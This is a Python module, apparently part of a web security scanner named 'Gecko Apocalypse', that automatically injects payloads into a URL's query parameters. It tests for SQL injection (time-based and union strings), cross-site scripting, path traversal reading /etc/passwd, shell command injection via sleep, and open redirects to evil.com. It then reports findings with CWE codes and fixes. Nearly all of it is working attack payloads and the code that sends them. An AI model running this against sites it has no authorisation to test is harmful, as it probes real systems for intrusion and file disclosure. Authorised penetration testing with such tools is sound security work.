"""GECKO APOCALYPSE - Classic Attacks (SQLi, XSS, LFI/RFI, Command Injection, XML Injection)"""
import asyncio, aiohttp, re, time
from typing import List, Dict, Optional
from urllib.parse import urlparse, parse_qs, urlencode

class ClassicAttacks:
    def __init__(self, session, config, db):
        self.session = session; self.config = config; self.db = db

    async def scan(self, url, content, headers, response):
        findings = []
        params = parse_qs(urlparse(url).query)
        for param in params:
            for t in [self._sqli, self._xss, self._lfi, self._cmdi, self._open_redirect]:
                r = await t(url, param)
                if r: findings.append(r); break
        return findings

    async def _sqli(self, url, param):
        payloads = ["' OR SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--", "' OR pg_sleep(5)--",
                     "1' AND 1=1--", "1' AND 1=2--", "' UNION SELECT NULL--"]
        for p in payloads:
            test = self._inject(url, param, p)
            t = time.time()
            try:
                async with self.session.get(test, timeout=aiohttp.ClientTimeout(total=15)) as r:
                    el = time.time() - t
                    c = await r.text(errors='ignore')
                    if el > 4.5:
                        return {'type':'SQL Injection (Time-Based)','severity':'CRITICAL','url':url,
                                'parameter':param,'payload':p,'evidence':f'Delayed {el:.1f}s',
                                'remediation':'Use parameterized queries','cwe':'CWE-89','owasp':'A03:2021'}
                    if any(e in c for e in ['SQL syntax','mysql_','ORA-','PostgreSQL','SQLITE_','syntax error']):
                        return {'type':'SQL Injection (Error-Based)','severity':'CRITICAL','url':url,
                                'parameter':param,'payload':p,'evidence':'SQL error in response',
                                'cwe':'CWE-89','owasp':'A03:2021'}
            except: pass

    async def _xss(self, url, param):
        marker = 'g3ck0xss'
        payloads = [f'<script>alert("{marker}")</script>', f'"><img src=x onerror=alert("{marker}")>',
                     f"'><svg/onload=alert('{marker}')>", f'javascript:alert("{marker}")']
        for p in payloads:
            test = self._inject(url, param, p)
            try:
                async with self.session.get(test, timeout=aiohttp.ClientTimeout(total=10)) as r:
                    c = await r.text(errors='ignore')
                    ct = r.headers.get('Content-Type','')
                    if marker in c and 'text/html' in ct:
                        return {'type':'Cross-Site Scripting (XSS)','severity':'HIGH','url':url,
                                'parameter':param,'payload':p,'evidence':'Payload reflected unencoded',
                                'remediation':'HTML-encode output, implement CSP','cwe':'CWE-79','owasp':'A03:2021'}
            except: pass

    async def _lfi(self, url, param):
        payloads = ['../../../../etc/passwd','..\\..\\..\\..\\windows\\win.ini',
                     '....//....//....//etc/passwd','%2e%2e%2f%2e%2e%2fetc/passwd',
                     '/etc/passwd', 'php://filter/convert.base64-encode/resource=/etc/passwd']
        for p in payloads:
            try:
                async with self.session.get(self._inject(url,param,p), timeout=aiohttp.ClientTimeout(total=10)) as r:
                    c = await r.text(errors='ignore')
                    if 'root:x:0:0' in c or '[extensions]' in c or 'cm9vd' in c:
                        return {'type':'Local File Inclusion (LFI)','severity':'CRITICAL','url':url,
                                'parameter':param,'payload':p,'evidence':c[:200],
                                'remediation':'Validate file paths, use whitelist','cwe':'CWE-22','owasp':'A01:2021'}
            except: pass

    async def _cmdi(self, url, param):
        payloads = ['; sleep 5','| sleep 5','`sleep 5`','$(sleep 5)','& ping -n 5 127.0.0.1']
        for p in payloads:
            t = time.time()
            try:
                async with self.session.get(self._inject(url,param,p), timeout=aiohttp.ClientTimeout(total=15)) as r:
                    if time.time() - t > 4.5:
                        return {'type':'OS Command Injection','severity':'CRITICAL','url':url,
                                'parameter':param,'payload':p,'evidence':f'Delayed {time.time()-t:.1f}s',
                                'cwe':'CWE-78','owasp':'A03:2021'}
            except: pass

    async def _open_redirect(self, url, param):
        if not any(k in param.lower() for k in ['url','redirect','next','return','goto','dest','continue']): return
        for target in ['https://evil.com','//evil.com','https://evil.com@legit.com']:
            try:
                async with self.session.get(self._inject(url,param,target), allow_redirects=False,
                                             timeout=aiohttp.ClientTimeout(total=10)) as r:
                    loc = r.headers.get('Location','')
                    if 'evil.com' in loc:
                        return {'type':'Open Redirect','severity':'MEDIUM','url':url,
                                'parameter':param,'payload':target,'evidence':f'Redirects to: {loc}',
                                'cwe':'CWE-601','owasp':'A01:2021'}
            except: pass

    def _inject(self, url, param, value):
        parsed = urlparse(url); params = parse_qs(parsed.query)
        params[param] = [value]
        return parsed._replace(query=urlencode(params, doseq=True)).geturl()
